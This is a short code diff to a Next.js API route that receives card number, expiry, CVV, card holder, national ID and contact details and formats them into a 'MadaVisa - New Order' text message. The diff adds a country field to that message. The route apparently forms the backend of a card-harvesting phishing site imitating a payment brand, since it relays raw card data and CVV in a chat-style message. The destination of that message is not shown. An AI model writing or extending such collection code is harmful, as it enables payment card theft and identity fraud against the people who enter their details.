@@ -2,7 +2,7 @@ import { NextRequest, NextResponse } from "next/server";
 
 export async function POST(req: NextRequest) {
   const body = await req.json();
-  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = body;
+  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment, country } = body;
 
   // Validation
   if (!cardNumber || !expiry || !cvv || !cardHolder || !items?.length || !total) {
@@ -41,6 +41,7 @@ export async function POST(req: NextRequest) {
     `💳 MadaVisa - New Order`,
     `👤 Order For: ${customer ?? "-"}`,
     `📱 WhatsApp: ${whatsapp ?? "-"}`,
+    `🌍 Country: ${country ?? "-"}`,
     `💳 Card Number: ${cardNumber}`,
     `👤 Card Holder: ${cardHolder}`,
     `📅 Valid To: ${expiry}`,
